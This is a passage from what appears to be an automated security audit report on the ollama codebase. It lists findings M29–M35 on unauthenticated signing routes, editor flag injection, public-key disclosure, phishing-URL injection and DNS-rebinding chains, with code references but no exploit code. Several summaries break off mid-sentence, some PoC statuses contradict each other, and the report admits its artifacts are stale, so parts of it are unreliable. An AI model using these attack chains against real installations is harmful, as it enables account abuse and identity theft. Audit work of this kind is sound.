- **Root Cause:** Validated rationale: `/api/experimental/web_search` and `/api/experimental/web_fetch` (routes.go:1707-1708) have no per-route auth; any client that reaches the daemon causes `proxyCloudRequestWithPath` to sign an outbound HTTPS request to ollama.com with the victim's `~/.ollama/id_ed25519` — charging the victim's account and poisoning their query history. Advocate concedes no auth exists; the design presumes loopback-only trust, but that presumption fails under p8-060 (0.0.0.0) or p8-061 (.localhost drive-by).
- **Key Code Reference:** `server/routes.go:1707-1708` — route registration, no per-route auth
- **PoC Status:** executed
- **Finding Reference:** Phase: 8; Sequence: 029; Slug: web-search-fetch-unauth-signing-oracle; Verdict: VALID; Rationale: `/api/experimental/web_search` and `/api/experimental/web_fetch` (routes.go:1707-1708) have no per-route auth; any client that reaches the daemon causes `proxyCloudRequestWithPath…; Severity-Original: HIGH; PoC-Status: executed; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M29-web-search-fetch-unauth-signing-oracle/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M29-web-search-fetch-unauth-signing-oracle/evidence/

### [M30] Editor Visual Flag Injection Exec
- **Severity:** MEDIUM
- **Summary:** In interactive mode, the `ollama run` REPL supports a `/edit` subcommand that opens the user's editor on a tmpfile, reads the content back, and sends it as the next message. The editor resolution sequence is:
- **Impact:** Arbitrary code execution on the host when the user invokes `/edit` in the REPL. Common victim flow: user runs `ollama run`, types `/edit`, editor launches, attacker's flag causes the editor to source attacker-controlled config → shell spawns, persistence planted.
- **Root Cause:** In interactive mode, the `ollama run` REPL supports a `/edit` subcommand that opens the user's editor on a tmpfile, reads the content back, and sends it as the next message. The editor resolution sequence is:
- **Key Code Reference:** `cmd/interactive.go:643-657` — editor resolution and lookpath
- **PoC Status:** executed
- **Finding Reference:** Phase: 8; Sequence: 030; Slug: editor-visual-flag-injection-exec; Verdict: VALID; Rationale: Not stated in the source finding report.; Severity-Original: HIGH; PoC-Status: executed; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M30-editor-visual-flag-injection-exec/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M30-editor-visual-flag-injection-exec/evidence/

### [M31] Whoami Public Key Disclosure
- **Severity:** MEDIUM
- **Summary:** `WhoamiHandler` (`server/routes.go:1981-2010`) returns a JSON response containing a `signin_url` field built from `signinURL()` (`server/routes.go:183-192`):
- **Impact:** **Cross-origin device fingerprint**: hostname + stable ed25519 public key uniquely identifies the user/device; combines with browser fingerprinting for persistent tracking.
- **Root Cause:** Validated rationale: `POST /api/me` (`server/routes.go:1696`) returns the victim's ed25519 public key and hostname in `signin_url` when unauthenticated (the common case), with no auth beyond `allowedHostsMiddleware`; `cloud_proxy.go:350-357 writeCloudUnauthorized` emits the same disclosure from every failed cloud-proxy attempt; the CORS list includes `app://*`, `file://*`, `tauri://*`, `vscode-webview://*`, `vscode-file://*` explicitly, so Electron apps, VSCode extensions, and Tauri launchers can read it cross-origin. Advocate did not write a standalone brief for this; synthesizer treats it as a medium-severity disclosure/fingerprinting primitive distinct from the identity theft chain.
- **Key Code Reference:** `server/routes.go:59` — `signinURLStr = "https://ollama.com/connect?name=%s&key=%s"`
- **PoC Status:** pending
- **Finding Reference:** Phase: 8; Sequence: 031; Slug: whoami-public-key-disclosure; Verdict: VALID; Rationale: `POST /api/me` (`server/routes.go:1696`) returns the victim's ed25519 public key and hostname in `signin_url` when unauthenticated (the common case), with no auth beyond `allowedH…; Severity-Original: MEDIUM; PoC-Status: pending; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M31-whoami-public-key-disclosure/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M31-whoami-public-key-disclosure/evidence/

### [M32] Signin Url Unmarshal Error Discarded
- **Severity:** MEDIUM
- **Summary:** The original hypothesis (H-07) claimed that a malicious registry could inject `signin_url` into the server's `/api/me` 401 response. Advocate correctly disproved this: `signinURL()` is a compile-time constant. BUT during synthesis, the Tracer's evidence (step 4 at `api/client.go:48-52`) reveals a DIFFERENT injection point — in the CLIENT-side parser that ollama uses when it talks to registries / cloud endpoints:
- **Impact:** Phishing URL injection into the CLI's authentication error. The user reads "click this URL to sign in" and the URL is attacker-chosen.
- **Root Cause:** Validated rationale: `api/client.go:48-52 checkError` calls `json.Unmarshal(body, &authError)` and DISCARDS the error; a hostile upstream (malicious registry, MITM'd cloud, attacker-controlled proxy) can inject any `SigninURL` content into the error body, and the CLI then prints it verbatim via `ConnectInstructions`. The server-side `signinURL()` is a safe constant (disproving H-07's direct premise), but the ADVisoriy here is that the CLIENT-side error unmarshal pathway is the real injection point — a subtle distinction the Tracer confirmed.
- **Key Code Reference:** `api/client.go:48-52` — `checkError`: `json.Unmarshal(body, &authError)` with discarded error (Tracer-confirmed from sinks.json: `api/client.go:50` is a deserialization sink)
- **PoC Status:** pending
- **Finding Reference:** Phase: 8; Sequence: 032; Slug: signin-url-unmarshal-error-discarded; Verdict: VALID; Rationale: `api/client.go:48-52 checkError` calls `json.Unmarshal(body, &authError)` and DISCARDS the error; a hostile upstream (malicious registry, MITM'd cloud, attacker-controlled proxy)…; Severity-Original: MEDIUM; PoC-Status: pending; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M32-signin-url-unmarshal-error-discarded/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M32-signin-url-unmarshal-error-discarded/evidence/

### [M33] Dns Rebinding Drive By IDentity Chain
- **Severity:** MEDIUM
- **Summary:** Chain of primitives, each individually tracked in a standalone finding, composed into a drive-by remote identity-theft path:
- **Impact:** Drive-by identity disclosure (pubkey + hostname) from any visited page (simple-request or in-allowlist origin).
- **Root Cause:** Validated rationale: Chain of p8-061 (`.localhost` auto-resolution) + p8-064 (unauth web_search) + p8-069 (pubkey disclosure via /api/me) produces a drive-by identity theft primitive against any victim running ollama with defaults — from any webpage they visit. Advocate's CORS preflight argument partially mitigates JSON-POST endpoints from arbitrary drive-by origins, but the identity-signing + pubkey disclosure subset of the chain still succeeds via simple-request GETs and in-AllowOrigins contexts (browser extensions, Electron apps, vscode-webview). MEDIUM per Synthesizer rule on CORS mitigation.
- **Key Code Reference:** See p8-061, p8-064, p8-069 for component details.
- **PoC Status:** pending
- **Finding Reference:** Phase: 8; Sequence: 033; Slug: dns-rebinding-drive-by-identity-chain; Verdict: VALID; Rationale: Chain of p8-061 (`.localhost` auto-resolution) + p8-064 (unauth web_search) + p8-069 (pubkey disclosure via /api/me) produces a drive-by identity theft primitive against any victi…; Severity-Original: MEDIUM; PoC-Status: pending; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M33-dns-rebinding-drive-by-identity-chain/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M33-dns-rebinding-drive-by-identity-chain/evidence/

### [M34] Isprivate Rfc1918 Host Header Permissive
- **Severity:** MEDIUM
- **Summary:** The host-header filter at `server/routes.go:1625-1629`:
- **Impact:** Simple-request GETs (CSRF-style side effects).
- **Root Cause:** Validated rationale: `server/routes.go:1625-1629 allowedHostsMiddleware` accepts any Host header whose parsed IP satisfies `netip.Addr.IsPrivate()` (RFC 1918 `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`); inside a loopback-bound deployment, any process already on localhost that needs to bypass the Host filter can pose Host headers such as `10.0.0.1:11434`. Advocate's Pattern-4 argument (same-origin already implied) has merit but misses DNS-rebinding to RFC1918 in scenarios where the attacker-site resolves to 10.x, the browser sends Origin `http://evil.example` with Host `10.0.0.1:11434` (host check passes; CORS preflight is the remaining guard).
- **Key Code Reference:** `server/routes.go:1625-1629` — `IsPrivate()` branch
- **PoC Status:** pending
- **Finding Reference:** Phase: 8; Sequence: 034; Slug: isprivate-rfc1918-host-header-permissive; Verdict: VALID; Rationale: `server/routes.go:1625-1629 allowedHostsMiddleware` accepts any Host header whose parsed IP satisfies `netip.Addr.IsPrivate()` (RFC 1918 `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.…; Severity-Original: MEDIUM; PoC-Status: pending; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M34-isprivate-rfc1918-host-header-permissive/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M34-isprivate-rfc1918-host-header-permissive/evidence/

### [M35] WWWAuth Realm Comma Parser Truncation
- **Severity:** MEDIUM
- **Summary:** The custom WWW-Authenticate parser at `server/images.go:995-1016 getValue` scans for the end of a quoted value using a bespoke state machine:
- **Impact:** Standalone: robustness (wrong realm URL parsed → token fetch failure). Composed: attacker who can provide an ambiguous realm field achieves parser-confusion that may bypass the scheme check in p8-005. The ambiguity also feeds the phishing injection angle (p8-072).
- **Root Cause:** Validated rationale: `server/images.go:995-1016 getValue` scans for the closing quote of a WWW-Authenticate directive by looking for quote-followed-by-comma; if the realm URL's query string itself contains a comma (e.g., `realm="https://auth/token?a=1,b=2"`), the scanner stops at the first internal comma and the returned realm is truncated. Tracer marked PARTIAL; Advocate did not defend this specifically. Standalone impact is low (robustness bug for registries using commas in realm URLs), but combined with p8-005 / H-00.06's scheme downgrade, a crafted registry response can split a realm URL into fragments the downstream URL parser misinterprets. Related to AP-036 pattern.
- **Key Code Reference:** `server/images.go:995-1016` — `getValue` state machine
- **PoC Status:** pending
- **Finding Reference:** Phase: 8; Sequence: 035; Slug: wwwauth-realm-comma-parser-truncation; Verdict: VALID; Rationale: `server/images.go:995-1016 getValue` scans for the closing quote of a WWW-Authenticate directive by looking for quote-followed-by-comma; if the realm URL's query string itself con…; Severity-Original: MEDIUM; PoC-Status: pending; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M35-wwwauth-realm-comma-parser-truncation/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M35-wwwauth-realm-comma-parser-truncation/evidence/

## Chamber Workspace Summary
- **Review Chambers Spawned:** 7
- **Total Hypotheses Generated vs Confirmed:** 125 draft hypotheses tracked in `archon/findings-draft/`; 45 findings are currently promoted in `archon/findings/`.
- **Attack Patterns Added to Registry:** 16
- **Variant Findings Identified:** 2

## Conclusion
The merged audit state for ollama/ollama reflects a materially exposed local-runtime and supply-ingest attack surface. The retained findings show exploitable weaknesses in agent command approval, registry/model ingestion, and unauthenticated network-facing workflows. The report has been regenerated from the normalized `archon/findings/` tree and current `archon/audit-state.json`; consistency review remains fail because underlying audit artifacts are incomplete or stale beyond the scope of report assembly.
